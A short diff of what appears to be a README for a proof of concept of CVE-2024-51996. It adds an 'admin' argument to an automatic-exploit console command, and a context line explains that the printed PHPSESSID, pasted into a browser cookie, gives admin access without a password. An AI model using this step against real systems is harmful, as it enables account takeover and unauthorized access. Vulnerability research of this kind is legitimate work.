@@ -49,7 +49,7 @@ If this value is retrieved and the cookie isn't expired, other value aren't actu
 #### Automatic exploit
 
 ```
-make console c="exploit:CVE-2024-51996"
+make console c="exploit:CVE-2024-51996 admin"
 ```
 
 Copy PHPSESSID output in your browser cookie to get `admin` account access without password.
